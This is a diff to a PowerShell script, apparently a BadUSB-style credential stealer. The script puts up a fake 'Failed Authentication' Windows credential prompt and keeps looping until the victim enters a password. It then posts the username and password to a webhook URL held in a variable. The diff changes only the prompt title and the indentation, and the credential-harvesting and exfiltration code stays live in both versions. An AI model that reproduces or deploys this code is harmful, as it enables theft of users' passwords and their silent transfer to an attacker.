@@ -38,7 +38,7 @@ $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgIm
  $form = $null
     while ($form -eq $null)
     {
-        $cred = $host.ui.promptforcredential('Failed Authentication!!','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
+        $cred = $host.ui.promptforcredential('Failed Authentication!v3','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
         $cred.getnetworkcredential().password
         if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password))
         {
@@ -66,13 +66,13 @@ $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgIm
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
-  $hookurl = "$dc"
-  $Body = @{
-    'username' = $env:username
-    'content' = "user: $userlogin - pass: $passlogin"
-  }
-  Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+$hookurl = "$dc"
+$Body = @{
+  'username' = $env:username 
+  'content' = "user: $userlogin - pass: $passlogin"
 }
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+
 
 
 #------------------------------------------------------------------------------------------------------------------------------------
